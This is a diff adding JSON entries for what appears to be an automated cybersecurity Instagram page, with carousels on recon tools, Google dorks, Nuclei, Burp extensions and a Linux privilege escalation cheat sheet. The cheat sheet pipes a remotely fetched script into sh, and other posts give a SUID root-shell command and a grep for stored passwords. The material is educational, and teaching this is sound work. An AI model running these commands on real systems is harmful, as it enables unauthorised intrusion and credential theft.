@@ -1158,5 +1158,362 @@
   "q": "Score yourself out of 5 below",
   "caption": "Fix all five and you're safer than most people online.\n\nComment your score and I'll tell you what to fix first.",
   "tags": "#cybersecurity #onlinesafety #infosec #cyberhygiene #cybersecurity #ethicalhacking #infosec #hacking #cybersecurityawareness"
+ },
+ {
+  "id": "g01-repos",
+  "type": "carousel",
+  "hook": "7 GitHub repos *every hacker stars*",
+  "sub": "Free. Open-source. Battle-tested.",
+  "slides": [
+   {
+    "h": "SecLists",
+    "b": "The wordlist collection almost every tool uses.",
+    "code": "github.com/danielmiessler/SecLists",
+    "prompt": false
+   },
+   {
+    "h": "PayloadsAllTheThings",
+    "b": "A huge library of payloads and bypass techniques, organized by vuln type.",
+    "code": "github.com/swisskyrepo/PayloadsAllTheThings",
+    "prompt": false
+   },
+   {
+    "h": "Nuclei",
+    "b": "Fast, template-based vulnerability scanner from ProjectDiscovery.",
+    "code": "github.com/projectdiscovery/nuclei",
+    "prompt": false
+   },
+   {
+    "h": "Sherlock",
+    "b": "Find a username across 300+ sites. Great for OSINT.",
+    "code": "github.com/sherlock-project/sherlock",
+    "prompt": false
+   },
+   {
+    "h": "Gitleaks",
+    "b": "Scan any repo for secrets before you push.",
+    "code": "github.com/gitleaks/gitleaks",
+    "prompt": false
+   },
+   {
+    "h": "Amass",
+    "b": "In-depth subdomain and attack-surface mapping.",
+    "code": "github.com/owasp-amass/amass",
+    "prompt": false
+   },
+   {
+    "h": "HackTricks",
+    "b": "Not a tool, a book. The best free pentest reference online.",
+    "code": "book.hacktricks.xyz",
+    "prompt": false
+   }
+  ],
+  "q": "Which repo did you not know?",
+  "caption": "Save this list. Star all 7 tonight, you'll use most of them within a month.\n\nAll free, all open-source, all legal to run in your own lab.\n\nEducational only. Use on your own lab or systems you have written permission to test.",
+  "tags": "#github #opensource #hackingtools #pentesting #cybersecurity #ethicalhacking #infosec #hacking #cybersecurityawareness"
+ },
+ {
+  "id": "g02-oneliners",
+  "type": "carousel",
+  "hook": "5 one-liners that *save hours*",
+  "sub": "Copy, paste, automate.",
+  "slides": [
+   {
+    "h": "Pull all subdomains, then check which are alive",
+    "b": "Two tools, one pipe, instant target list.",
+    "code": "subfinder -d target.com | httpx -silent"
+   },
+   {
+    "h": "Find every JS file on a domain, fast",
+    "b": "Hidden endpoints often sit inside JS.",
+    "code": "katana -u https://target.com -jc | grep '.js'"
+   },
+   {
+    "h": "Mass-screenshot a list of hosts",
+    "b": "See 100 sites at a glance instead of opening each one.",
+    "code": "gowitness file -f hosts.txt"
+   },
+   {
+    "h": "Grep for AWS keys in a cloned repo",
+    "b": "Catch secrets before you report them.",
+    "code": "grep -rE 'AKIA[0-9A-Z]{16}' ."
+   },
+   {
+    "h": "Watch a log file live, filtered",
+    "b": "Classic, but still the fastest way to tail errors.",
+    "code": "tail -f access.log | grep 403"
+   }
+  ],
+  "q": "Save your favourite one-liner below",
+  "caption": "Automation isn't about replacing skill, it's about skipping the boring parts so you can focus on the interesting bugs.\n\nSave this, you'll use it on your next engagement.\n\nEducational only. Use on your own lab or systems you have written permission to test.",
+  "tags": "#bashscripting #automation #pentesting #hackingtools #cybersecurity #ethicalhacking #infosec #hacking #cybersecurityawareness"
+ },
+ {
+  "id": "g03-cheatsheet",
+  "type": "carousel",
+  "hook": "The Linux privilege escalation *cheat sheet*",
+  "sub": "Screenshot this one.",
+  "slides": [
+   {
+    "h": "Check sudo rights first",
+    "b": "Fastest win if it's misconfigured.",
+    "code": "sudo -l"
+   },
+   {
+    "h": "Find SUID binaries",
+    "b": "A classic path to root.",
+    "code": "find / -perm -4000 -type f 2>/dev/null"
+   },
+   {
+    "h": "Look for writable cron jobs",
+    "b": "Edit a script root runs on a schedule.",
+    "code": "cat /etc/crontab"
+   },
+   {
+    "h": "Check kernel version",
+    "b": "Old kernels have public exploits.",
+    "code": "uname -a"
+   },
+   {
+    "h": "Search for creds in configs",
+    "b": "People leave passwords in plaintext constantly.",
+    "code": "grep -ri pass /etc -R 2>/dev/null"
+   },
+   {
+    "h": "Automate it all",
+    "b": "GTFOBins and linPEAS cover the rest.",
+    "code": "curl -s linpeas.sh | sh"
+   }
+  ],
+  "q": "Save this for your next CTF box",
+  "caption": "This is the exact checklist I run on every Linux privesc box, lab or CTF.\n\nPair it with linPEAS and GTFOBins for the deep dive.\n\nEducational only. Use on your own lab or systems you have written permission to test.",
+  "tags": "#privesc #linux #ctf #oscp #pentesting #cybersecurity #ethicalhacking #infosec #hacking #cybersecurityawareness"
+ },
+ {
+  "id": "g04-automation",
+  "type": "carousel",
+  "hook": "I automated my *recon pipeline*: here's how",
+  "sub": "From domain to report, zero manual steps.",
+  "slides": [
+   {
+    "h": "Step 1: Subdomain discovery",
+    "b": "subfinder + assetfinder, merged and deduped.",
+    "code": "subfinder -d $1 -silent > subs.txt"
+   },
+   {
+    "h": "Step 2: Find the live ones",
+    "b": "Dead subdomains waste your time.",
+    "code": "httpx -l subs.txt -silent > live.txt"
+   },
+   {
+    "h": "Step 3: Screenshot everything",
+    "b": "Visual triage in seconds.",
+    "code": "gowitness file -f live.txt"
+   },
+   {
+    "h": "Step 4: Scan with Nuclei templates",
+    "b": "Known CVEs and misconfigs, flagged automatically.",
+    "code": "nuclei -l live.txt -t cves/"
+   },
+   {
+    "h": "Step 5: Wrap it in a bash script",
+    "b": "Chain every step, run it with one command.",
+    "code": "bash recon.sh target.com"
+   }
+  ],
+  "q": "Want the full recon.sh script?",
+  "caption": "A good recon pipeline is the difference between hours and minutes.\n\nComment 'recon' and I'll share the full script in the next post.\n\nEducational only. Use on your own lab or systems you have written permission to test.",
+  "tags": "#recon #automation #bugbounty #bashscripting #cybersecurity #ethicalhacking #infosec #hacking #cybersecurityawareness"
+ },
+ {
+  "id": "g05-dorks",
+  "type": "carousel",
+  "hook": "Google dorks that *reveal too much*",
+  "sub": "OSINT, not hacking.",
+  "slides": [
+   {
+    "h": "Find exposed config files",
+    "b": "Misconfigured servers index files they shouldn't.",
+    "code": "site:target.com filetype:env"
+   },
+   {
+    "h": "Find login panels",
+    "b": "Maps the attack surface before testing.",
+    "code": "site:target.com inurl:admin"
+   },
+   {
+    "h": "Find exposed documents",
+    "b": "PDFs and docs often leak internal info.",
+    "code": "site:target.com filetype:pdf"
+   },
+   {
+    "h": "Find subdomains indexed by Google",
+    "b": "A free, passive recon source.",
+    "code": "site:*.target.com"
+   },
+   {
+    "h": "Find error messages",
+    "b": "Stack traces hint at the tech stack and bugs.",
+    "code": "site:target.com \"SQL syntax\""
+   }
+  ],
+  "q": "Which dork surprised you most?",
+  "caption": "Google dorking is 100% passive OSINT, no packets sent to the target.\n\nUse it only on programs that allow recon, and never access anything you find without authorization.\n\nEducational only. Use on your own lab or systems you have written permission to test.",
+  "tags": "#googledorking #osint #recon #bugbounty #cybersecurity #ethicalhacking #infosec #hacking #cybersecurityawareness"
+ },
+ {
+  "id": "g06-nuclei",
+  "type": "carousel",
+  "hook": "Nuclei: scan *thousands of CVEs* in minutes",
+  "sub": "The scanner every bounty hunter runs.",
+  "slides": [
+   {
+    "h": "What it is",
+    "b": "A fast scanner driven by community-written YAML templates."
+   },
+   {
+    "h": "Basic scan",
+    "b": "Point it at one host.",
+    "code": "nuclei -u https://target.com"
+   },
+   {
+    "h": "Scan a list",
+    "b": "Run it across your whole recon output.",
+    "code": "nuclei -l live.txt -t cves/ -o results.txt"
+   },
+   {
+    "h": "Update templates often",
+    "b": "New CVEs get templates within hours of disclosure.",
+    "code": "nuclei -update-templates"
+   },
+   {
+    "h": "Combine with recon",
+    "b": "subfinder, httpx, then nuclei, is the standard bounty combo."
+   }
+  ],
+  "q": "Have you found a real bug with Nuclei?",
+  "caption": "Nuclei turns 1000s of known CVEs into a scan you can run before coffee finishes brewing.\n\nAlways confirm manually before reporting. Scanners produce false positives.\n\nEducational only. Use on your own lab or systems you have written permission to test.",
+  "tags": "#nuclei #vulnerabilityscanning #bugbounty #projectdiscovery #cybersecurity #ethicalhacking #infosec #hacking #cybersecurityawareness"
+ },
+ {
+  "id": "g07-gtfobins",
+  "type": "carousel",
+  "hook": "GTFOBins: the *list that breaks CTFs*",
+  "sub": "Every binary, every bypass.",
+  "slides": [
+   {
+    "h": "What it is",
+    "b": "A catalog of Unix binaries that can be abused to escalate privileges."
+   },
+   {
+    "h": "How to use it",
+    "b": "Find a SUID binary, then look it up on gtfobins.github.io."
+   },
+   {
+    "h": "Classic example",
+    "b": "If find has the SUID bit, this gets you a root shell.",
+    "code": "find . -exec /bin/sh -p \\; -quit"
+   },
+   {
+    "h": "Why it matters",
+    "b": "Attackers don't need malware when misconfigurations do the work."
+   },
+   {
+    "h": "Defense",
+    "b": "Remove SUID bits you don't need. Audit with find regularly."
+   }
+  ],
+  "q": "Which GTFOBins trick have you used?",
+  "caption": "GTFOBins is one of the highest-value bookmarks in offensive security. Check it on every privesc challenge.\n\nEducational only. Use on your own lab or systems you have written permission to test.",
+  "tags": "#gtfobins #privesc #ctf #linux #cybersecurity #ethicalhacking #infosec #hacking #cybersecurityawareness"
+ },
+ {
+  "id": "g08-burpext",
+  "type": "carousel",
+  "hook": "5 Burp extensions *serious hunters install*",
+  "sub": "From the BApp Store, all free.",
+  "slides": [
+   {
+    "h": "Logger++",
+    "b": "Advanced logging and filtering of every request."
+   },
+   {
+    "h": "Autorize",
+    "b": "Automates access-control testing across user roles."
+   },
+   {
+    "h": "JS Link Finder",
+    "b": "Pulls endpoints straight out of JavaScript files."
+   },
+   {
+    "h": "Param Miner",
+    "b": "Finds hidden, unlinked parameters."
+   },
+   {
+    "h": "Turbo Intruder",
+    "b": "Scriptable, high-speed request sending for race conditions."
+   }
+  ],
+  "q": "Which extension should I cover in depth?",
+  "caption": "Default Burp is powerful. These five extensions make it dangerous, in a good way.\n\nEducational only. Use on your own lab or systems you have written permission to test.",
+  "tags": "#burpsuite #bugbounty #webpentesting #hackingtools #cybersecurity #ethicalhacking #infosec #hacking #cybersecurityawareness"
+ },
+ {
+  "id": "g09-automate-ig",
+  "type": "reel",
+  "hook": "I automated *this Instagram page* with code",
+  "sub": "Here's the actual stack.",
+  "slides": [
+   {
+    "h": "The brain",
+    "b": "Python renders every slide and Reel automatically, no manual design."
+   },
+   {
+    "h": "The scheduler",
+    "b": "GitHub Actions runs on a cron job, 7 PM every day, free."
+   },
+   {
+    "h": "The publisher",
+    "b": "Instagram's Graph API posts the carousel and handles captions."
+   },
+   {
+    "h": "The result",
+    "b": "A full content pipeline that runs without me opening Canva once."
+   }
+  ],
+  "q": "Want a tutorial on building this?",
+  "caption": "This whole page runs on a free GitHub Actions pipeline. Comment 'automate' if you want the breakdown.",
+  "tags": "#automation #github #buildinpublic #devtools #cybersecurity #ethicalhacking #infosec #hacking #cybersecurityawareness"
+ },
+ {
+  "id": "g10-redteam",
+  "type": "carousel",
+  "hook": "Red Team vs Blue Team vs Purple Team",
+  "sub": "Which side are you on?",
+  "slides": [
+   {
+    "h": "Red Team",
+    "b": "Simulates real attackers to test defenses."
+   },
+   {
+    "h": "Blue Team",
+    "b": "Detects, defends and responds to incidents."
+   },
+   {
+    "h": "Purple Team",
+    "b": "Red and Blue working together, sharing findings live."
+   },
+   {
+    "h": "Which pays more?",
+    "b": "Red Team roles often pay more, but Blue Team hires more people."
+   },
+   {
+    "h": "Where to start",
+    "b": "Try both. CTFs teach Red. Home-lab SIEM setups teach Blue."
+   }
+  ],
+  "q": "Red, Blue, or Purple?",
+  "caption": "Most people assume hacking only means Red Team. Blue Team is just as technical, and in higher demand.\n\nEducational only. Use on your own lab or systems you have written permission to test.",
+  "tags": "#redteam #blueteam #purpleteam #cybersecuritycareers #cybersecurity #ethicalhacking #infosec #hacking #cybersecurityawareness"
  }
 ]
